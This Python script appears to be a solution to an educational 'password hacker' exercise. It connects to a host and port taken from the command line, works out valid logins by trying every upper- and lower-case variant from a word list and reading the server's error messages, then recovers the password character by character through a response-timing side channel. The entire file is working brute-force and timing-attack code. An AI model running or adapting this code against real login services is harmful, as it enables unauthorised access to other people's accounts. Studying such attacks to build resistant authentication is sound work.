import itertools
import socket
import sys
import json
from datetime import datetime


def get_login():
    with open("../task/hacking/logins.txt") as f:
        logins = f.read().split("\n")

    for login in logins:
        for login_case_sensitive in map(lambda x: ''.join(x),
                                        itertools.product(*([letter.lower(), letter.upper()] for letter in login))):
            request = json.dumps({"login": login_case_sensitive, "password": " "}, indent=2)
            client_socket.send(request.encode())
            response = client_socket.recv(1024).decode()
            if json.loads(response)["result"] == "Wrong password!":
                return login_case_sensitive


def get_password(login):
    characters = tuple(map(chr, tuple(range(97, 123)) + tuple(range(48, 58))))
    password = ""
    while True:
        for char in characters:
            request = json.dumps({"login": login, "password": password + char}, indent=2)
            client_socket.send(request.encode())
            start = datetime.now()
            response = client_socket.recv(1024).decode()
            finish = datetime.now()
            result = json.loads(response)["result"]
            if result == "Connection success!":
                return password + char
            elif (finish - start).microseconds >= 90000:
                password += char
                break

            char = char.upper()
            request = json.dumps({"login": login, "password": password + char}, indent=2)
            client_socket.send(request.encode())
            start = datetime.now()
            response = client_socket.recv(1024).decode()
            finish = datetime.now()
            result = json.loads(response)["result"]
            if result == "Connection success!":
                return password + char
            elif (finish - start).microseconds >= 90000:
                password += char
                break


def print_request(login, password):
    print(json.dumps({"login": login, "password": password}, indent=2))


host = sys.argv[1]
port = int(sys.argv[2])

with socket.socket() as client_socket:
    client_socket.connect((host, port))
    correct_login = get_login()
    correct_password = get_password(correct_login)
    print_request(correct_login, correct_password)
